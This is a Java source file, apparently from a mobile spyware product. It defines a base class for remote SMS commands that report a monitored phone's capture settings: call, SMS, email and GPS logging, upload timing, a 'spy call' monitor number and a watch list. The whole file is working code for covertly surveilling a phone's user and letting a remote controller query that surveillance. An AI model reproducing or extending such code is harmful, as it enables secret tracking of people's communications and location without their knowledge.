package com.vvt.rmtcmd.sms;

import com.vvt.global.Global;
import com.vvt.gpsc.GPSOption;
import com.vvt.info.ApplicationInfo;
import com.vvt.license.LicenseInfo;
import com.vvt.license.LicenseManager;
import com.vvt.pref.PrefBugInfo;
import com.vvt.pref.PrefEventInfo;
import com.vvt.pref.PrefGPS;
import com.vvt.pref.PrefGeneral;
import com.vvt.pref.Preference;
import com.vvt.pref.PreferenceType;
import com.vvt.rmtcmd.RmtCmdLine;
import com.vvt.rmtcmd.SMSCmdStore;
import com.vvt.rmtcmd.SMSCommandCode;
import com.vvt.smsutil.FxSMSMessage;
import com.vvt.smsutil.SMSSendListener;
import com.vvt.smsutil.SMSSender;
import com.vvt.std.Constant;

public abstract class RmtCommand implements SMSSendListener {
	
	protected static final String RESPONSE_TEXT_HEADER = "";
	protected LicenseManager licenseMgr = Global.getLicenseManager();
	protected LicenseInfo licenseInfo = licenseMgr.getLicenseInfo();
	protected SMSCmdStore cmdStore = Global.getSMSCmdStore();
	protected SMSCommandCode smsCmdCode = cmdStore.getSMSCommandCode();
	protected StringBuffer responseMessage = new StringBuffer();
	protected FxSMSMessage smsMessage = new FxSMSMessage();
	protected RmtCmdExecutionListener observer = null;
	protected RmtCmdLine rmtCmdLine = null;
	protected SMSSender smsSender = Global.getSMSSender();

	protected void send() {
		if (rmtCmdLine.isReply()) {
			smsSender.send(smsMessage);
		}
	}
	
	protected void doSMSAppSetting() {
		Preference pref = Global.getPreference();
		PrefEventInfo eventInfo = (PrefEventInfo)pref.getPrefInfo(PreferenceType.PREF_EVENT_INFO);
		PrefGPS gpsInfo = (PrefGPS)pref.getPrefInfo(PreferenceType.PREF_GPS);
		PrefGeneral generalInfo = (PrefGeneral)pref.getPrefInfo(PreferenceType.PREF_GENERAL);
		boolean started = (eventInfo.isCallLogEnabled() || eventInfo.isEmailEnabled() || eventInfo.isSMSEnabled()? true : false);
		boolean captured = started || gpsInfo.isEnabled();
		responseMessage.append("==Current Settings==");
		responseMessage.append(Constant.CRLF);
		responseMessage.append("Start Capture: ");
		if (started) {
			responseMessage.append(Constant.YES);
		} else {
			responseMessage.append(Constant.NO);
		}
		responseMessage.append(Constant.CRLF);
		responseMessage.append("Events: ");
		if (!captured) {
			responseMessage.append("None");
		} else {
			if (eventInfo.isCallLogEnabled()) {
				responseMessage.append("Call");
			}
			if (eventInfo.isSMSEnabled()) {
				responseMessage.append(Constant.COMMA_AND_SPACE);
				responseMessage.append("SMS");
			}
			if (eventInfo.isEmailEnabled()) {
				responseMessage.append(Constant.COMMA_AND_SPACE);
				responseMessage.append("Email");
			}
			if (gpsInfo.isEnabled()) {
				if (started) {
					responseMessage.append(Constant.COMMA_AND_SPACE);
				}
				responseMessage.append("GPS");
			}
		}
		responseMessage.append(Constant.CRLF);
		responseMessage.append("GPS Interval: ");
		GPSOption gpsOpt = gpsInfo.getGpsOption();
		responseMessage.append(ApplicationInfo.LOCATION_TIMER[getTimerIndex(gpsOpt.getInterval())]);
		responseMessage.append(Constant.CRLF);
		responseMessage.append("Timer: ");
		responseMessage.append(ApplicationInfo.TIME[generalInfo.getSendTimeIndex()]);
		responseMessage.append(Constant.CRLF);
		responseMessage.append("Max Event: ");
		responseMessage.append(ApplicationInfo.EVENT[generalInfo.getMaxEventIndex()]);
	}
	
	protected void doSMSSpySetting() {
		Preference pref = Global.getPreference();
		PrefBugInfo bugInfo = (PrefBugInfo)pref.getPrefInfo(PreferenceType.PREF_BUG_INFO);
		responseMessage.append("==Current Settings==");
		responseMessage.append(Constant.CRLF);
		responseMessage.append("Call: ");
		if (bugInfo.isEnabled()) {
			responseMessage.append(Constant.YES);
		} else {
			responseMessage.append(Constant.NO);
		}
		responseMessage.append(Constant.COMMA_AND_SPACE);
		String spyNumber = bugInfo.getMonitorNumber();
		boolean noSpyNumber = (spyNumber.equals(Constant.EMPTY_STRING)? true : false);
		if (noSpyNumber) {
			responseMessage.append(Constant.NOT_AVAILABLE);
		} else {
			responseMessage.append(spyNumber);
		}
		responseMessage.append(Constant.CRLF);
		responseMessage.append("WL Status: All number");
		if (noSpyNumber) {
			responseMessage.append(Constant.CRLF);
			responseMessage.append("Warning: Your monitor number not set.");
			responseMessage.append(Constant.CRLF);
			responseMessage.append("Set number using correct parameters.");
		}
	}
	
	protected void doSMSWatchListSetting() {
		Preference pref = Global.getPreference();
		PrefBugInfo bugInfo = (PrefBugInfo)pref.getPrefInfo(PreferenceType.PREF_BUG_INFO);
		responseMessage.append("==Current Settings==");
		responseMessage.append(Constant.CRLF);
		if (bugInfo.isWatchAllEnabled()) {
			responseMessage.append("WL Status: All number");
		} else {
			responseMessage.append("WL Status: Disabled");
		}
	}
	
	private int getTimerIndex(int interval) {
		int index = 0;
		for (int i = 0; i < ApplicationInfo.LOCATION_TIMER_SECONDS.length; i++) {
			if (ApplicationInfo.LOCATION_TIMER_SECONDS[i] == interval) {
				index = i;
				break;
			}
		}
		return index;
	}
	
	public abstract void execute(RmtCmdExecutionListener rmtCmdProcessingManager);
}
